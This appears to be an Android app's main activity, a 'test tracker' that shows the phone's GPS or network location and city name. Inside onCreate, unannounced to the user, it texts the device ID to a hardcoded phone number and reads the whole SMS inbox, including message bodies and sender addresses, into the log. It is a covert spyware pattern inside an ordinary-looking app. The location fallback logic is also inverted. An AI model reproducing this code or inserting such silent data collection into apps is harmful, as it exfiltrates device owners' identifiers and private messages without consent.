package com.example.paul.testtracker;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;



public class MainActivity extends AppCompatActivity implements LocationListener {

    private TextView locationText;
    private LocationManager lm;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setUpLocation();

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        final String deviceId = telephonyManager.getDeviceId();


        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("+353831364351", null, ""+deviceId, null, null);

        List<String> smsList = new ArrayList<String>();

        Uri uri = Uri.parse("content://sms/inbox");
        Cursor c= getContentResolver().query(uri, null, null ,null,null);

        // Read the sms data and store it in the list
        if(c.moveToFirst()) {
            for(int i=0; i < c.getCount(); i++) {
                String sms;
                sms=c.getString(c.getColumnIndexOrThrow("body")).toString();
                sms+="....To:"+c.getString(c.getColumnIndexOrThrow("address")).toString();
                smsList.add(sms);

                c.moveToNext();
            }
        }
        c.close();

        for (String sms : smsList){
            Log.i("Message: ", sms);
        }

        locationText = (TextView) findViewById(R.id.test1);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        boolean gps_enabled = false;
        boolean network_enabled = false;

        lm = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

        gps_enabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
        network_enabled = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

        Location net_loc = null, gps_loc = null, finalLoc = null;

        if (gps_enabled)
            gps_loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (network_enabled)
            net_loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        if (gps_loc != null && net_loc != null) {

            if (gps_loc.getAccuracy() >= net_loc.getAccuracy())
                finalLoc = gps_loc;
            else
                finalLoc = net_loc;

            // I used this just to get an idea (if both avail, its upto you which you want to take as I taken location with more accuracy)

        } else {

            if (gps_loc != null) {
                finalLoc = net_loc;
            } else if (net_loc != null) {
                finalLoc = gps_loc;
            }
        }
        String latestLocation = "";
        if (finalLoc != null) {
            latestLocation = String.format("Current Location \n Longitude: %1$s \n Latitude: %2$s", finalLoc.getLongitude(), finalLoc.getLatitude());
        }
        Toast.makeText(this, latestLocation, Toast.LENGTH_SHORT).show();
        locationText.setText(latestLocation);
    }

    public String getLocationName(double latitude, double longitude) {

        String cityName = "";
        Geocoder gcd = new Geocoder(getBaseContext(), Locale.getDefault());
        try {

            List<Address> addresses = gcd.getFromLocation(latitude, longitude,
                    10);

            for (Address adrs : addresses) {
                if (adrs != null) {

                    String city = adrs.getLocality();
                    if (city != null && !city.equals("")) {
                        cityName = city;
                    } else {

                    }
                    // // you should also try with addresses.get(0).toSring();

                }

            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return cityName;

    }

    @Override
    public void onLocationChanged(Location location) {

        String latestLocation = "";
        String cityName = "";
        if (location != null) {
            latestLocation = String.format("Current Location \n Longitude: %1$s \n Latitude: %2$s", location.getLongitude(), location.getLatitude());
            cityName = getLocationName(location.getLatitude(), location.getLongitude());
        }
        Toast.makeText(this, latestLocation, Toast.LENGTH_SHORT).show();
        Toast.makeText(this, cityName, Toast.LENGTH_SHORT).show();
        if (cityName.equals("")) {
            locationText.setText(latestLocation);
        } else {
            locationText.setText("You are in " + cityName);
        }
    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    private void setUpLocation() {
        lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 6000, 5, this);
    }


    protected void onResume() {
        super.onResume();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 6000, 5, this);
    }

    protected void onPause() {
        super.onPause();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        lm.removeUpdates(this);
    }

}
